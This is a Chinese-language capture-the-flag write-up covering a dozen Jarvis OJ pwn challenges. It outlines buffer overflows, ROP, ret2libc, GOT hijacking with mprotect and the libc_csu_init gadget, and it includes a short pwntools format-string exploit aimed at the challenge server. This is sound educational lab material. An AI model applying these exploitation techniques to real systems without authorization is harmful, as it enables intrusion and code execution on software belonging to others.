# Jarvis OJ - Write Up

> 目錄:
> * [smashes](#smashes)
> * [tell_me_something](#tell_me_something)
> * [xman_level0](#xman_level0)
> * [xman_level1](#xman_level1)
> * [xman_level2](#xman_level2)
> * [xman_level2_x64](#xman_level2_x64)
> * [xman_level3](#xman_level3)
> * [xman_level3_x64](#xman_level3_x64)
> * [xman_level4](#xman_level4)
> * [xman_level5](#xman_level5)
> * [61dctf_fm](#61dctf_fm)
> * [guess](#guess)

smashes
---

這題有 Canary 但找不到繞過的方式，但透過 ida pro 可以看到 flag 直接放在程式裡面

那可以透過 SSP leak 的方式，蓋 flag 的位置到 argv[0] 來印出

但可以看到在觸發 canary 保護機制前，他會把放 flag 的地方清掉

但這題有 ELF remapping ，可以在其他位置上找到 flag 的地址


tell_me_something
---

可以看到程式裡面有 good_game() 這個函數，會印出 flag

所以就是 buffer overflow 後跳函數即可

xman_level0
---

同 Tell me Something ， overflow 後跳函數即可

xman_level1 
---

沒有開任何保護，直接將 shellcode 塞到 buf 後跳過去即可

xman_level2
---

/bin/sh 和 system@plt 都可以直接在程式上找到

直接構造 rop 即可

xman_level2_x64
---

/bin/sh 和 system@plt 都可以直接在程式上找到

直接構造 rop 即可

xman_level3
---

利用 write 來 leak base address 後，算出 system 和 /bin/sh 

之後 ROP

xman_level3_x64
---

這題沒有給 system 

但有給 libc 

然後程式裡面也可以找到 sh

所以就是ret2libc ，用 write leak base address

之後算出 system 後執行 system(“sh”)

===
主要有一個問題是，找不到 rdx 的 gadget ，但看調適可以知道他的值會很大


xman_level4
---

這題和前面的差別在，沒有給 libc ，所以可以使用 DynELF

或者 ret2dlresolve 之類的

xman_level5
---
> Description:
>
> mmap和mprotect练习，假设system和execve函数被禁用，请尝试使用mmap和mprotect完成本题。

網路上好像都是用 mprotect ，所以這邊也是參考別人的來做，紀錄一下...

第一個 payload 流程:
1. write(1, write@got, ...) 用來 leak base 來算 mprotect
2. read(0, libc_start_main@got, ...) GOT hijack ，蓋為 mprotect
3. read(0, bss, ...) 放 shellcode
4. read(0, gmon_start@got, ...) GOT hijack ，蓋為 bss
5. 返回 main ，準備第二個 payload

構造第二個payload 中，因為找沒有 pop rdx 這個 gadget ，

所以使用 libc_csu_init 這個萬能 gadget

```
0000000000400650 <__libc_csu_init>:
  400650:       41 57                   push   r15
  400652:       41 89 ff                mov    r15d,edi
  400655:       41 56                   push   r14
  400657:       49 89 f6                mov    r14,rsi
  40065a:       41 55                   push   r13
  40065c:       49 89 d5                mov    r13,rdx
  40065f:       41 54                   push   r12
  400661:       4c 8d 25 d8 01 20 00    lea    r12,[rip+0x2001d8]        # 600840 <__frame_dummy_init_array_entry>
  400668:       55                      push   rbp
  400669:       48 8d 2d d8 01 20 00    lea    rbp,[rip+0x2001d8]        # 600848 <__init_array_end>
  400670:       53                      push   rbx
  400671:       4c 29 e5                sub    rbp,r12
  400674:       31 db                   xor    ebx,ebx
  400676:       48 c1 fd 03             sar    rbp,0x3
  40067a:       48 83 ec 08             sub    rsp,0x8
  40067e:       e8 fd fd ff ff          call   400480 <_init>
  400683:       48 85 ed                test   rbp,rbp
  400686:       74 1e                   je     4006a6 <__libc_csu_init+0x56>
  400688:       0f 1f 84 00 00 00 00    nop    DWORD PTR [rax+rax*1+0x0]
  40068f:       00
  400690:       4c 89 ea                mov    rdx,r13
  400693:       4c 89 f6                mov    rsi,r14
  400696:       44 89 ff                mov    edi,r15d
  400699:       41 ff 14 dc             call   QWORD PTR [r12+rbx*8]
  40069d:       48 83 c3 01             add    rbx,0x1
  4006a1:       48 39 eb                cmp    rbx,rbp
  4006a4:       75 ea                   jne    400690 <__libc_csu_init+0x40>
  4006a6:       48 83 c4 08             add    rsp,0x8
  4006aa:       5b                      pop    rbx
  4006ab:       5d                      pop    rbp
  4006ac:       41 5c                   pop    r12
  4006ae:       41 5d                   pop    r13
  4006b0:       41 5e                   pop    r14
  4006b2:       41 5f                   pop    r15
  4006b4:       c3                      ret

```

第二個 payload 流程:
1. 先跳到 0x4006a6 ，這邊設定 rbx和rbp 要注意 0x40069d 那兩行，等等會跳到那
2. rbx = 0, rbp = 1
3. ret 那邊要蓋為 0x400690，第一次是 call mprotect 來設 bss 為 rwx
4. 所以我們可以知道 rdx = r13, rsi = r14, rdi = edi = r15, r12 = 要跳的位址 = mprotect
5. 第二次要跳 shellcode，這樣就可以 get shell


本地測試正常，不知道為啥丟遠端會有問題，感覺是網路延遲= =...
[參考](http://veritas501.space/2017/03/10/JarvisOJ_WP/)



61dctf_fm
---

這題是基本的 format string vuln

漏洞是 `printf(buf);`

然後只要把 x 從 3 改為 4 即可 

```python
#!/usr/bin/env python
from pwn import *
context.arch = 'i386'
#r = process('/tmp/p/a')
r = remote('pwn2.jarvisoj.com',9895)
x = 0x0804a02c
r.sendline(p32(x) + "%11$hhn")
r.interactive()
```


guess
---

直接丟 ida pro ，可以知道他會開 socket 在本地 port: 9999

然後主要程式在 handle() 裡面，輸入長度要求是 100



